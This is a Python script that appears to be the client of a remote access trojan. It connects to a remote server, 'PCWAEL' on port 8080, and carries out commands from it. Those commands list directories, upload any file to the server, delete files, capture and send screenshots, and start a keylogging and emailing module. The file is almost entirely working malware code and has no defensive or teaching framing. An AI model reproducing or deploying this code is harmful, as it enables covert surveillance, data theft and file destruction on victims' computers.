import os
import sys
import socket
from PIL import ImageGrab
from subprocess import call
import keyboard
import logger1

s = socket.socket()
port = 8080
host = 'PCWAEL'
s.connect((host,port))
print("")
print("connected to the server successfully")

# connection complited

#command reciving and execution



while 1:
    command = s.recv(5000)
    command = command.decode()
    command = str(command)
    print("")
    print("Command recived")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed seccessfully..")
        print("")
    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed seccessfully..")
        print("")
    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("file has been sent successfully..")
        print("")
    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("file removed")
        print("")
    elif command == "capture":
        os32=str(sys.platform)
        if os32 == 'win32':
            snapshot = ImageGrab.grab()
            save_path = "screenshot.jpg"
            snapshot.save(save_path)
        else:
            call(["screencapture", "screenshot.jpg"])
        screen = open("screenshot.jpg","rb")
        data = screen.read()
        screen.close()
        s.send(data)
        print("")
        print("screen has been sent successfully..")
        print("")
    elif command == "log":
        emailing = s.recv(5000)
        emailing = emailing.decode()
        os32=str(sys.platform)
        if emailing == "1":
            logger1.email()
        else:
            os.system('python start.py')

        
    else:
        print("")
        print("try again")
